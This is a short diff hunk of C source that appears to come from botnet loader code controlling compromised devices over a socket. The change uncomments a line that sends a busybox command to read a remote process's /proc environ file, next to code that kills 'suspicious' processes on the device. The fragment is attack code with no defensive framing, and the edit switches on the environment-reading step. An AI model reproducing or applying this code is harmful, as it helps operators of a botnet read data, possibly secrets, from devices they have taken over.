@@ -310,7 +310,7 @@ int connection_consume_psoutput(struct connection *conn)
 
                     if (num_alphas == 0 && num_count > 0)
                     {
-                        //util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
+                        util_sockprintf(conn->fd, "/bin/busybox cat /proc/%d/environ", pid); // lol
 #ifdef DEBUG
                         printf("Killing suspicious process (pid=%d, name=%s)\n", pid, proc_name);
 #endif
